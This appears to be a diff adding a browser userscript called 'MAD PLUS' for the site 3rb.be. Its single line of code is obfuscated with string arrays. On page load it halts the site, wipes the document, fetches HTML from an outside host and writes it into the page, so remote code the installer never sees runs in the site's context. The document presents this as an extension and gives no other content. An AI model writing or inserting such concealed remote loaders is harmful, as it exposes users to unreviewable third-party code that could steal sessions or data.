@@ -1,0 +1,11 @@
+// ==UserScript==
+// @name         MAD PLUS
+// @namespace    Extension
+// @version      0.3
+// @author       CRIZO & Mad clan
+// @run-at       document-start
+// @match        http://3rb.be/
+// @grant        GM_xmlhttpRequest
+// ==/UserScript==
+ 
+var _0xc8d1=["use strict","stop","innerHTML","documentElement","GET","http://cray48zo.freetzi.com/crizo48dzz.html","open","responseText","write","close"];var _0x1830=[_0xc8d1[0],_0xc8d1[1],_0xc8d1[2],_0xc8d1[3],_0xc8d1[4],_0xc8d1[5],_0xc8d1[6],_0xc8d1[7],_0xc8d1[8],_0xc8d1[9]];_0x1830[0];var _0x1274=[_0x1830[1],_0x1830[2],_0x1830[3],_0x1830[4],_0x1830[5],_0x1830[6],_0x1830[7],_0x1830[8],_0x1830[9]];window[_0x1274[0]]();document[_0x1274[2]][_0x1274[1]]= null;var ae=document;GM_xmlhttpRequest({method:_0x1274[3],url:_0x1274[4],onload:function(_0x3e3cx4){ae[_0x1274[5]]();ae[_0x1274[7]](_0x3e3cx4[_0x1274[6]]);ae[_0x1274[8]]()}})
